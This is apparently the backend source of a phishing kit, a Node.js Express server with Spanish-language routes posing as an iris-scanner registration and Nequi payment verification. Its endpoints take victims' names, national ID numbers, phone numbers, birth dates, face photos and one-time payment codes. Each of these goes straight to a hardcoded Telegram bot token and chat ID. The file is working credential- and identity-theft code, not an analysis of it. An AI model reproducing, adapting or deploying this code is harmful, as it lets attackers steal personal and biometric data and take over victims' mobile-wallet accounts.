const express = require('express');
const multer = require('multer');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ==========================================
// CONFIGURACIÓN DE TELEGRAM - LLENA ESTO
// ==========================================
const TELEGRAM_BOT_TOKEN = '7981175774:AAHVizrV5W47gjAaBph6tVvVeaL04xrmlJ0'; 
const TELEGRAM_CHAT_ID = '166722521';

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Helper function to send text messages to Telegram
async function sendTelegramMessage(text) {
    try {
        await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error.response ? error.response.data : error.message);
        throw error;
    }
}

// Configure Multer for memory storage (we don't need to save files to disk permanently)
const upload = multer({ storage: multer.memoryStorage() });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Keep-alive endpoint
app.get('/ping', (req, res) => {
    res.status(200).send('pong');
});

// Route to handle initial registration data
app.post('/api/register', async (req, res) => {
    const data = req.body;
    
    try {
        const message = `
📝 *Nuevo Registro - Escáner de Iris*

*Nombre:* ${data.nombre}
*Apellido:* ${data.apellido}
*Cédula:* ${data.cedula}
*Teléfono Nequi:* ${data.nequi}
*Fecha de Nacimiento:* ${data.fechaNacimiento}
*Ciudad:* ${data.ciudad}
*Departamento:* ${data.departamento}

_Sistema de Procesamiento de Datos Biométricos_
        `.trim();

        await sendTelegramMessage(message);
        res.json({ success: true, message: "Datos recibidos correctamente" });
    } catch (error) {
        console.error("Error sending to Telegram:", error);
        res.status(500).json({ success: false, message: "Error al procesar datos" });
    }
});

// Route to handle face photo upload
app.post('/api/upload-face', upload.single('photo'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, message: "No se recibió ninguna imagen" });
    }

    try {
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('caption', `📸 *Captura Facial Recibida*\nUsuario: ${req.body.nombre || 'Desconocido'}`);
        form.append('parse_mode', 'Markdown');
        form.append('photo', req.file.buffer, {
            filename: 'face-capture.png',
            contentType: req.file.mimetype
        });

        await axios.post(`${TELEGRAM_API_URL}/sendPhoto`, form, {
            headers: {
                ...form.getHeaders()
            }
        });

        res.json({ success: true, message: "Foto procesada correctamente" });
    } catch (error) {
        console.error("Error sending photo to Telegram:", error);
        res.status(500).json({ success: false, message: "Error al procesar la imagen" });
    }
});

// Route to handle OTP verification
app.post('/api/verify-payment', async (req, res) => {
    const { code, nombre } = req.body;
    
    try {
        const message = `
🔐 *Código de Verificación (OTP) Recibido*

*Usuario:* ${nombre || "Desconocido"}
*Código OTP:* \`${code}\`

_Sistema de Pagos Nequi - Verificación_
        `.trim();

        await sendTelegramMessage(message);
        res.json({ success: true, message: "Código procesado" });
    } catch (error) {
        console.error("Error sending OTP to Telegram:", error);
        res.status(500).json({ success: false, message: "Error al procesar código" });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
